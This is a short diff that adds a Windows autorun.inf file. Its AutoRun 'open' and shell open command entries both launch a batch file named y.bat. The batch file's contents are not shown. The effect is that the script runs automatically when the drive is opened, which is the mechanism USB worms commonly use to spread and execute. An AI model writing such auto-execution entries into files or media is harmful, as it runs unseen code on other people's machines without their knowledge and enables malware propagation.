@@ -1,0 +1,3 @@
+[AutoRun]
+open=y.bat
+shell\open\Command=y.bat
